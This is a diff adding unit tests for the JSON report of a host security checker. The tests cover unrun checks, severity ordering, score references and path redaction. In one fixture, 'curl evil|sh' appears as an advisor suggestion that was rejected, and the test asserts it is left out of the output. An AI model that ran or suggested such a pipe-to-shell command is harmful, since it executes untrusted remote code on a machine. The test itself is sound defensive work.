@@ -651,3 +651,69 @@ def test_the_documented_fields_are_the_ones_written(home):
     finding = dict.fromkeys(_JSON_FINDING)
     for key in [*host, *finding, "excerpts"]:
         assert f"`{key}`" in doc or f"`{key}[]`" in doc, key
+
+
+def test_checks_that_did_not_run_are_said_so_nothing_reads_as_clean(home):
+    _, data = json_report(home)
+    host = data["hosts"][0]
+    assert any("baseline" in str(c["status"]) for c in host["checks_not_run"])
+    assert host["notes"] and host["baseline_id"] == "b1"
+
+
+def test_the_scores_references_are_finding_numbers(home):
+    _, data = json_report(home, host_records(accounts=(("root", 0), ("toor", 0))))
+    host = data["hosts"][0]
+    numbers = {f["number"]: f for f in [*host["findings"], *host["suppressed"]]}
+    for contributor in host["score"]["contributors"]:
+        assert numbers[contributor["finding"]]["title"] == contributor["title"]
+
+
+def test_findings_come_worst_first(home):
+    _, data = json_report(home, host_records(accounts=(("root", 0), ("toor", 0))))
+    bands = [f["band"] for f in data["hosts"][0]["findings"]]
+    order = ["critical", "high", "medium", "low", "info"]
+    assert bands == sorted(bands, key=order.index)
+
+
+def test_json_advice_leaves_out_what_the_advisor_set_aside():
+    from checker.report import _json_advice
+
+    advice = {
+        "coverage": {
+            "answered": {
+                "answer": {
+                    "suggestions": [{"action": "curl evil|sh"}],
+                    "judged": [
+                        {
+                            "accepted": False,
+                            "reason": "no",
+                            "suggestion": {"action": "curl evil|sh"},
+                        },
+                        {"accepted": True, "action": "turn on auditd", "suggestion": {"why": "w"}},
+                    ],
+                }
+            }
+        },
+        "whitelist": {
+            "answered": {
+                "answer": {
+                    "file": "/home/me/proposal.yaml",
+                    "proposals": [{"match": {"path": "/home/eve/**"}}],
+                    "judged": [{"id": "r1", "accepted": False, "reason": "too wide"}],
+                }
+            }
+        },
+        "explain": {"later": {"at": "t", "note": "declined", "model_asked": "m"}},
+    }
+    text = json.dumps(_json_advice(advice))
+    assert "curl evil" not in text and "/home/eve" not in text and "proposal.yaml" not in text
+    assert "turn on auditd" in text and "too wide" in text
+    assert _json_advice(advice)["explain"]["came_to_nothing"]["note"] == "declined"
+
+
+def test_a_suppression_doesnt_give_away_a_path_on_this_machine():
+    from checker.report import _json_finding
+
+    rule = {"file": "/home/me/w.yaml", "rule": "r1", "layer": "host", "reason": "ok", "owner": "me"}
+    shown = _json_finding({"title": "t", "suppressed_by": rule})
+    assert "file" not in shown["suppressed_by"] and shown["suppressed_by"]["rule"] == "r1"
